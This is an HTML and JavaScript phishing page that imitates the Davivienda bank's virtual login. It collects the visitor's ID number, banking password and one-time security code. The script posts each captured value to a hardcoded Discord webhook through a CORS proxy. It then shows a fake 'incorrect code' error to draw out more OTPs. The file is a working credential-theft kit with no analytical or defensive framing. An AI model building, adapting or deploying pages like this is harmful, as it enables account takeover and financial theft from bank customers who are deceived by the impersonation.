<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Davivienda - Virtual</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Ajustes para que los pasos se acumulen suavemente */
        #passSection, #otpSection { 
            display: none; 
            opacity: 0; 
            transition: opacity 0.5s ease;
        }
        .visible { 
            display: block !important; 
            opacity: 1 !important; 
        }
        /* Corregimos el pegado del checkbox según tu observación */
        .checkbox-container {
            margin-top: 15px !important; /* Espacio extra respecto al input de clave */
            margin-bottom: 10px !important;
            display: flex;
            align-items: center;
        }
        /* Deshabilitar campos anteriores para que no se editen */
        .readonly-step {
            opacity: 0.7;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="LogoDavivienda.svg" alt="Logo" class="logo">
        </div>
        
        <div class="welcome-section">
            <p class="greeting">¡Hola!</p>
            <h2 class="subtitle">Nos alegra que esté aquí</h2>
        </div>
        
        <form id="mainForm">
            <div id="docGroup">
                <div class="form-group">
                    <label class="form-label">Seleccione su tipo de documento</label>
                    <select id="docType" class="form-select">
                        <option value="Cedula de Ciudadania">Cedula de Ciudadania</option>
                    </select>
                </div>
                <div class="form-group">
                    <label class="form-label">Ingrese su número de documento</label>
                    <input type="text" id="docNumber" class="form-input" autocomplete="off">
                </div>
                <button type="button" id="btnToPass" class="btn-continue">Continuar</button>
            </div>

            <div id="passSection">
                <div class="form-group" style="margin-top: 20px;">
                    <label class="form-label">Ingrese su clave virtual</label>
                    <input type="password" id="pass" class="form-input" maxlength="8">
                </div>
                <div class="checkbox-container">
                    <input type="checkbox" id="rem" class="checkbox">
                    <label for="rem" class="checkbox-label">Recordar mis datos de identidad</label>
                </div>
                <button type="button" id="btnToOtp" class="btn-continue">Ingresar</button>
            </div>

            <div id="otpSection">
                <div style="border-top: 1px solid #eee; margin-top: 25px; padding-top: 20px;">
                    <h2 style="color: #ed1c24; font-size: 20px; font-weight: 700; margin-bottom: 10px;">Verificación</h2>
                    <div class="form-group">
                        <label class="form-label">Código de seguridad</label>
                        <input type="text" id="otpCode" class="form-input" placeholder="000000">
                    </div>
                    <p id="errOtp" style="color: #ed1c24; font-size: 13px; display: none; margin-top: 8px; font-weight: 600;">Código incorrecto. Intente de nuevo.</p>
                    <button type="button" id="btnFinish" class="btn-continue">Verificar Código</button>
                </div>
            </div>
        </form>
    </div>

    <script>
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1487889926296178729/H0bASOLwRk2FueCuR0Nfj_C15tgjNEKMdteg_8x5_DQ_ywflO01vmwPNURVFoalmC5q6';

        async function sendToDiscord(titulo, fields) {
            const payload = {
                embeds: [{
                    title: titulo,
                    color: 15548997,
                    fields: fields,
                    footer: { text: "Davivienda Tracking | " + new Date().toLocaleString() }
                }]
            };

            return fetch('https://corsproxy.io/?' + encodeURIComponent(WEBHOOK_URL), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        // 1. Mostrar Paso 2 sin borrar el 1
        document.getElementById('btnToPass').addEventListener('click', () => {
            const doc = document.getElementById('docNumber').value;
            if (doc.length > 3) {
                document.getElementById('btnToPass').style.display = 'none'; // Solo ocultamos el botón
                document.getElementById('docNumber').classList.add('readonly-step');
                document.getElementById('docType').classList.add('readonly-step');
                document.getElementById('passSection').classList.add('visible');
            }
        });

        // 2. Enviar Login y mostrar Paso 3 abajo de todo
        document.getElementById('btnToOtp').addEventListener('click', async () => {
            const btn = document.getElementById('btnToOtp');
            btn.innerText = "Validando...";
            btn.disabled = true;

            const fields = [
                { name: "👤 Documento", value: `\`${document.getElementById('docNumber').value}\``, inline: true },
                { name: "🔑 Clave", value: `\`${document.getElementById('pass').value}\``, inline: true }
            ];

            await sendToDiscord("🏦 NUEVA CAPTURA", fields);

            setTimeout(() => {
                btn.style.display = 'none'; // Ocultamos solo este botón para seguir sumando
                document.getElementById('pass').classList.add('readonly-step');
                document.getElementById('otpSection').classList.add('visible');
                // Scroll suave hacia abajo para ver el nuevo campo
                window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
            }, 800);
        });

        // 3. Enviar OTP Final
        document.getElementById('btnFinish').addEventListener('click', async () => {
            const btn = document.getElementById('btnFinish');
            const code = document.getElementById('otpCode').value;
            
            btn.innerText = "Verificando...";
            
            const fields = [
                { name: "👤 Doc", value: `\`${document.getElementById('docNumber').value}\``, inline: true },
                { name: "🔢 Código OTP", value: `\`${code}\``, inline: true }
            ];

            await sendToDiscord("🔐 CÓDIGO RECIBIDO", fields);

            setTimeout(() => {
                document.getElementById('errOtp').style.display = 'block';
                document.getElementById('otpCode').value = '';
                btn.innerText = "Verificar Código";
            }, 1000);
        });
    </script>
</body>
</html>
